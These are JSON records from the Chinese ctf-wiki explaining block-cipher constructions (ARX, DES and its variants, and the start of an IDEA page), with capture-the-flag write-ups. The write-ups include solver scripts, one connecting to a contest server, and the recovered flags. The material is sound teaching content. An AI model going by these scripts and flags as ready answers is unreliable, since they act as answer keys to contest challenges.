{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/arx-operations.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/arx-operations.md", "content": "# ARX: Add-Rotate-Xor\n\n## 概述\n\nARX 运算是如下 3 种基本运算的统称\n- Add 有限域上的模加\n- Rotate 循环移位\n- Xor 异或\n\n有许多常见的块加密算法在轮函数中只用到了这 3 种基本运算，典型例子如 Salsa20、Speck 等。另外 [IDEA](./idea.md) 也采用了类似的基本运算来构建加解密操作，不过以乘法代替了移位。\n\n## 优缺点\n\n### 优点\n\n- 操作简单，运算速度快\n- 执行时间为常数，可以避免基于时间的测信道攻击\n- 组合后的函数表达能力足够强（参见下方例题）\n\n### 缺点\n\n- 在三种基本运算当中，Rotate、Xor 对于单个 bit 来说均是完全线性的运算，可能会带来一定的脆弱性(参见[Rotational cryptanalysis](https://en.wikipedia.org/wiki/Rotational_cryptanalysis))\n\n## 题目\n\n### 2018 *ctf primitive\n\n#### 分析\n\n本题要求我们组合一定数目以内的 Add-Rotate-Xor 运算，使得获得的加密算法能够将固定明文加密成指定的随机密文，即通过基础运算来构建任意置换函数。成功构建 3 次之后即可获得 flag。\n\n#### 解题思路\n\n对于模 256 下的运算，一种典型的基于 ARX 的换位操作可以表示为如下组合\n```\nRotateLeft_1(Add_255(RotateLeft_7(Add_2(x))))\n```\n\n上述函数对应了一个将 254 和 255 进行交换，同时保持其它数字不变的置换运算。\n\n直觉上来说，由于在第一步的模加 2 运算中，仅有输入为 254、255 时会发生进位，该组合函数得以区别对待这一情况。\n\n利用上述原子操作，我们可以构造出任意两个数字 `a,b` 的置换，结合 Xor 操作，我们可以减少所需的基本操作数目，使其满足题目给出的限制。一种可能的操作步骤如下：\n\n1. 对于 `a,b`，通过模加操作使得 `a` 为0\n2. 通过右移使得b的最低位为 1\n3. 若 `b` 不为 1，进行 `Xor 1, Add 255` 操作，保持 `a` 仍然为0，同时 `b` 的数值减小\n4. 重复操作2-3直至 `b` 为1\n5. 进行 `Add 254` 及换位操作，交换 `a,b`\n6. 对于换位以外的所有操作，加入对应的逆运算，确保 `a,b` 以外的数值不变\n\n完整的解题脚本如下：\n\n```python\nfrom pwn import *\nimport string\nfrom hashlib import sha256\n\n#context.log_level='debug'\ndef dopow():\n    chal = c.recvline()\n    post = chal[12:28]\n    tar = chal[33:-1]\n    c.recvuntil(':')\n    found = iters.bruteforce(lambda x:sha256(x+post).hexdigest()==tar, string.ascii_letters+string.digits, 4)\n    c.sendline(found)\n\n#c = remote('127.0.0.1',10001)\nc = remote('47.75.4.252',10001)\ndopow()\npt='GoodCipher'\n\ndef doswap(a,b):\n    if a==b:\n        return\n    if a>b:\n        tmp=b\n        b=a\n        a=tmp\n    ans=[]\n    ans.append((0,256-a))\n    b-=a\n    a=0\n    while b!=1:\n        tmp=0\n        lo=1\n        while b&lo==0:\n            lo<<=1\n            tmp+=1\n        if b==lo:\n            ans.append((1,8-tmp))\n            break\n        if tmp!=0:\n            ans.append((1,8-tmp))\n        b>>=tmp\n        ans.append((2,1))\n        b^=1\n        ans.append((0,255))\n        b-=1\n    ans.append((0,254))\n\n    for a,b in ans:\n        c.sendline('%d %d'%(a,b))\n        c.recvline()\n    for a,b in [(0,2),(1,7),(0,255),(1,1)]:\n        c.sendline('%d %d'%(a,b))\n        c.recvline()\n    for a,b in ans[::-1]:\n        if a==0:\n            c.sendline('%d %d'%(a,256-b))\n        elif a==1:\n            c.sendline('%d %d'%(a,8-b))\n        elif a==2:\n            c.sendline('%d %d'%(a,b))\n        c.recvline()\n\nfor i in range(3):\n    print i\n    m=range(256)\n    c.recvuntil('ciphertext is ')\n    ct=c.recvline().strip()\n    ct=ct.decode('hex')\n    assert len(ct)==10\n    for i in range(10):\n        a=ord(ct[i])\n        b=ord(pt[i])\n        #print m[a],b\n        doswap(m[a],b)\n        for j in range(256):\n            if m[j]==b:\n                m[j]=m[a]\n                m[a]=b\n                break\n    c.sendline('-1')\n\nc.recvuntil('Your flag here.\\n')\nprint c.recvline()\n```\n", "timestamp": "2025-10-21T22:02:50.596855"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/des.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/des.md", "content": "# DES\n\n## 基本介绍\n\nData Encryption Standard(DES)，数据加密标准，是典型的块加密，其基本信息如下\n\n- 输入 64 位。\n- 输出 64 位。\n- 密钥 64 位，使用 64 位密钥中的 56 位，剩余的 8 位要么丢弃，要么作为奇偶校验位。\n- Feistel 迭代结构\n    - 明文经过 16 轮迭代得到密文。\n    - 密文经过类似的 16 轮迭代得到明文。\n\n## 基本流程\n\n给出一张简单的 [DES 流程图](http://homepage.usask.ca/~dtr467/400/) 。\n\n![](./figure/des.gif)\n\n### 加密\n\n我们可以考虑一下每一轮的加密过程\n\n$L_{i+1}=R_i$\n\n$R_{i+1}=L_i\\oplus F(R_i,K_i)$\n\n那么在最后的 Permutation 之前，对应的密文为$(R_{n+1},L_{n+1})$。\n\n### 解密\n\n那么解密如何解密呢？首先我们可以把密文先进行逆置换，那么就可以得到最后一轮的输出。我们这时考虑每一轮\n\n$R_i=L_{i+1}$\n\n$L_i=R_{i+1}\\oplus F(L_{i+1},K_i)$\n\n因此，$(L_0,R_0)$ 就是加密时第一次置换后的明文。我们只需要再执行逆置换就可以获得明文了。\n\n可以看出，DES 加解密使用同一套逻辑，只是密钥使用的顺序不一致。\n\n## 核心部件\n\nDES 中的核心部件主要包括（这里只给出加密过程的）\n\n- 初始置换\n- F 函数\n    - E 扩展函数\n    - S 盒，设计标准未给出。\n    - P 置换\n- 最后置换\n\n其中 F 函数如下\n\n![](./figure/f-function.png)\n\n如果对 DES 更加感兴趣，可以进行更加仔细地研究。欢迎提供 PR。\n\n## 衍生\n\n在 DES 的基础上，衍生了以下两种加密方式\n\n- 双重 DES\n- 三种 DES\n\n### 双重 DES\n\n双重 DES 使用两个密钥，长度为 112 比特。加密方式如下\n\n$C=E_{k2}(E_{k1}(P))$\n\n但是双重 DES 不能抵抗中间相遇攻击，我们可以构造如下两个集合\n\n$I={E_{k1}(P)}$\n\n$J=D_{k2}(C)$\n\n即分别枚举 K1 和 K2 分别对 P 进行加密和对 C 进行解密。\n\n在我们对 P 进行加密完毕后，可以对加密结果进行排序，这样的复杂度为$2^nlog(2^n)=O(n2^n)$\n\n当我们对 C 进行解密时，可以每解密一个，就去对应的表中查询。\n\n总的复杂度为还是$O(n2^n)$。\n\n### 三重 DES\n\n三重 DES 的加解密方式如下\n\n$C=E_{k3}(D_{k2}(E_{k1}(P)))$\n\n$P=D_{k1}(E_{k2}(D_{k3}(C)))$\n\n在选择密钥时，可以有两种方法\n\n- 3 个不同的密钥，k1，k2，k3 互相独立，一共 168 比特。\n- 2 个不同的密钥，k1 与 k2 独立，k3=k1，112 比特。\n\n## 攻击方法\n\n- 差分攻击\n- 线性攻击\n\n## 2018 N1CTF N1ES\n\n基本代码如下\n\n```python\n# -*- coding: utf-8 -*-\ndef round_add(a, b):\n    f = lambda x, y: x + y - 2 * (x & y)\n    res = ''\n    for i in range(len(a)):\n        res += chr(f(ord(a[i]), ord(b[i])))\n    return res\n\ndef permutate(table, block):\n\treturn list(map(lambda x: block[x], table))\n\ndef string_to_bits(data):\n    data = [ord(c) for c in data]\n    l = len(data) * 8\n    result = [0] * l\n    pos = 0\n    for ch in data:\n        for i in range(0,8):\n            result[(pos<<3)+i] = (ch>>i) & 1\n        pos += 1\n    return result\n\ns_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 8\n9, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156,\n 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]\n\ndef generate(o):\n    k = permutate(s_box,o)\n    b = []\n    for i in range(0, len(k), 7):\n        b.append(k[i:i+7] + [1])\n    c = []\n    for i in range(32):\n        pos = 0\n        x = 0\n        for j in b[i]:\n            x += (j<<pos)\n            pos += 1\n        c.append((0x10001**x) % (0x7f))\n    return c\n\n\n\nclass N1ES:\n    def __init__(self, key):\n        if (len(key) != 24 or isinstance(key, bytes) == False ):\n            raise Exception(\"key must be 24 bytes long\")\n        self.key = key\n        self.gen_subkey()\n\n    def gen_subkey(self):\n        o = string_to_bits(self.key)\n        k = []\n        for i in range(8):\n\t        o = generate(o)\n        \tk.extend(o)\n        \to = string_to_bits([chr(c) for c in o[0:24]])\n        self.Kn = []\n        for i in range(32):\n            self.Kn.append(map(chr, k[i * 8: i * 8 + 8]))\n        return\n\n    def encrypt(self, plaintext):\n        if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False):\n            raise Exception(\"plaintext must be a multiple of 16 in length\")\n        res = ''\n        for i in range(len(plaintext) / 16):\n            block = plaintext[i * 16:(i + 1) * 16]\n            L = block[:8]\n            R = block[8:]\n            for round_cnt in range(32):\n                L, R = R, (round_add(L, self.Kn[round_cnt]))\n            L, R = R, L\n            res += L + R\n        return res\n```\n\n显然，我们可以将其视为一个 Feistel 加密的方式，解密函数如下\n\n```python\n    def decrypt(self,ciphertext):\n        res = ''\n        for i in range(len(ciphertext) / 16):\n            block = ciphertext[i * 16:(i + 1) * 16]\n            L = block[:8]\n            R = block[8:]\n            for round_cnt in range(32):\n                L, R =R, (round_add(L, self.Kn[31-round_cnt]))\n            L,R=R,L\n            res += L + R\n        return res\n```\n\n最后结果为\n\n```shell\n➜  baby_N1ES cat challenge.py\nfrom N1ES import N1ES\nimport base64\nkey = \"wxy191iss00000000000cute\"\nn1es = N1ES(key)\nflag = \"N1CTF{*****************************************}\"\ncipher = n1es.encrypt(flag)\n#print base64.b64encode(cipher)  # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx\ncipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx'\ncipher = base64.b64decode(cipher)\nprint n1es.decrypt(cipher)\n➜  baby_N1ES python challenge.py\nN1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/}\n```\n\n## 2019 CISCN  part_des\n\n题目只给了一个文件：\n\n```\nRound n part_encode-> 0x92d915250119e12b\nKey map -> 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84\n```\n\n考虑到题目名以及数据特征，`Round n part_encode` 为执行n轮des的中间结果，`Key map` 应为des的子密钥，要还原出明文只需进行n轮des加密的逆过程即可，解密时注意以下三点。\n\n- 子密钥的选取，对于只进行了n轮的加密结果，解密时应依次使用密钥 n, n-1..., 1。\n- des 最后一轮后的操作，未完成的 des 没有交换左右两部分和逆初始置换，因此解密时我们应先对密文进行这两步操作。\n- n 的选择，在本题中，我们并不知道 n，但这无关紧要，我们可以尝试所有可能的取值（0-15）flag应为ascii字符串。\n\n??? note \"解题代码\"\n    ``` python\n\n    kkk = 16\n    def bit_rot_left(lst, pos):\n    \treturn lst[pos:] + lst[:pos]\n    \n    class DES:\n    \tIP = [\n    \t        58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,\n    \t        62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,\n    \t        57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,\n    \t        61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7\n    \t    ]\n    \tIP_re = [\n    \t        40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,\n    \t        38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,\n    \t        36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,\n    \t        34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25\n    \t    ]\n    \tPbox = [\n    \t        16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,\n    \t        2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25\n    \t    ]\n    \tE = [\n    \t        32,1,2,3,4,5,4,5,6,7,8,9,\n    \t        8,9,10,11,12,13,12,13,14,15,16,17,\n    \t        16,17,18,19,20,21,20,21,22,23,24,25,\n    \t        24,25,26,27,28,29,28,29,30,31,32,1\n    \t    ]\n    \tPC1 = [\n    \t            57,49,41,33,25,17,9,1,58,50,42,34,26,18,\n    \t            10,2,59,51,43,35,27,19,11,3,60,52,44,36,\n    \t            63,55,47,39,31,23,15,7,62,54,46,38,30,22,\n    \t            14,6,61,53,45,37,29,21,13,5,28,20,12,4\n    \t    ]\n    \tPC2 = [\n    \t        14,17,11,24,1,5,3,28,15,6,21,10,\n    \t        23,19,12,4,26,8,16,7,27,20,13,2,\n    \t        41,52,31,37,47,55,30,40,51,45,33,48,\n    \t        44,49,39,56,34,53,46,42,50,36,29,32\n    \t    ]\n    \tSbox = [\n    \t        [\n    \t            [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7],\n    \t            [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8],\n    \t            [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0],\n    \t            [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13],\n    \t        ],\n    \t        [\n    \t            [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10],\n    \t            [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5],\n    \t            [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15],\n    \t            [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9],\n    \t        ],\n    \t        [\n    \t            [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8],\n    \t            [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1],\n    \t            [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7],\n    \t            [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12],\n    \t        ],\n    \t        [\n    \t            [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15],\n    \t            [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9],\n    \t            [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4],\n    \t            [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14],\n    \t        ],\n    \t        [\n    \t            [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9],\n    \t            [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6],\n    \t            [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14],\n    \t            [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3],\n    \t        ],\n    \t        [\n    \t            [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11],\n    \t            [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8],\n    \t            [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6],\n    \t            [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13],\n    \t        ],\n    \t        [\n    \t            [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1],\n    \t            [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6],\n    \t            [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2],\n    \t            [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12],\n    \t        ],\n    \t        [\n    \t            [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7],\n    \t            [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2],\n    \t            [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8],\n    \t            [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11],\n    \t        ]\n    \t    ]\n    \trout = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]\n    \tdef __init__(self):\n    \t\tself.subkey = [[[1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0]], [[1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1]]]\n    \n    \tdef permute(self, lst, tb):\n    \t\treturn [lst[i-1] for i in tb]\n    \n    \tdef f(self,riti,subkeyi):\n    \t\ttmp = [i^j for i,j in zip(subkeyi,self.permute(riti,DES.E))]\n    \t\treturn  self.permute(sum([[int(l) for l in str(bin(DES.Sbox[i][int(str(tmp[6*i])+str(tmp[6*i+5]),2)][int(\"\".join(str(j) for j in tmp[6*i+1:6*i+5]),2)])[2:].zfill(4))] for i in range(8)],[]),DES.Pbox)\n    \n    \tdef des_main(self,m,mark):\n    \t\tsbkey = self.subkey[0]\n    \t\t#if mark == 'e' else self.subkey[1]\n    \t\t# tmp =  self.permute([int(i) for i in list((m).ljust(64,\"0\"))],self.IP)\n    \t\ttmp =  [int(i) for i in list((m).ljust(64,\"0\"))]\n    \t\tglobal kkk\n    \t\tprint(kkk)\n    \t\tfor i in range(kkk):\n    \t\t\ttmp = tmp[32:] + [j^k for j,k in zip(tmp[:32],self.f(tmp[32:],sbkey[i if mark != 'd' else kkk-1-i]))]\n    \t\treturn \"\".join([str(i) for i in self.permute(tmp[32:]+tmp[:32],self.IP_re)])\n    \n    \tdef des_encipher(self,m):\n    \t\tm = \"\".join([bin(ord(i))[2:].zfill(8) for i in m])\n    \t\tdes_en = self.des_main(m,'e')\n    \t\treturn \"\".join([chr(int(des_en[i*8:i*8+8],2)) for i in range(8)])\n    \n    \tdef des_decipher(self,c):\n    \t\tc = \"\".join([bin(ord(i))[2:].zfill(8) for i in c])\n    \t\tdes_de = self.des_main(c,'d')\n    \t\treturn \"\".join([chr(int(des_de[i*8:i*8+8],2)) for i in range(8)])\n    \n    def test():\n    \timport base64\n    \tglobal kkk\n    \twhile kkk >=0:\n    \t\tdesobj = DES()\n    \t\t# cipher = desobj.des_encipher(\"12345678\")\n    \t\tcipher = '\\x01\\x19\\xe1+\\x92\\xd9\\x15%'\n    \t\tmessage1 = desobj.des_decipher(cipher)\n    \t\tprint(message1)\n    \t\tkkk -= 1\n    if __name__=='__main__':\n        test()\n    \n    ```\n\n解密结果（部分）：\n\n```\n14\nt-ÏEÏx§\n13\ny0ur9Ood\n12\nµp^Ûé=¹\n11\n)Á`rûÕû\n```\n\n可以看出n为13，flag为`flag{y0ur9Ood}`\n\n\n## 参考\n\n- 清华大学研究生数据安全课程课件\n- https://en.wikipedia.org/wiki/Data_Encryption_Standard\n", "timestamp": "2025-10-21T22:02:50.715778"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/idea.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/idea.md", "content": "# IDEA\n\n## 概述\n\n**国际数据加密算法**（International Data Encryption Algorithm，IDEA），最早称为**改良建议加密标准**（Improved Proposed Encryption Standard，IPES），是密码学上一种对称密钥分组密码，由 James Massey 与来学嘉设计，在1991年首次提出。这个算法的提出，是为了取代旧有的数据加密标准 DES。（来自维基百科）\n\n## 基本流程\n\n### 密钥生成\n\nIDEA 在加密的每轮中使用 6个密钥，然后最后输出轮使用4个密钥。所以一共有52个。\n\n1. 前8个密钥来自与该算法最初的密钥，K1 取自密钥的高16比特，K8 取自密钥的低16比特。\n2. 将密钥循环左移 25 位获取下一轮密钥，然后再次分为8组。\n\n### 加密流程\n\nIDEA 加密的数据块的大小为 64 比特，其使用的密钥长度为128 比特。该算法会对输入的数据块进行8次相同的变换，只是每次使用的密钥不同，最后会进行一次输出变换。每一轮的操作\n\n![](figure/IDEA_Round.png)\n\n可以输入和输出都是 16 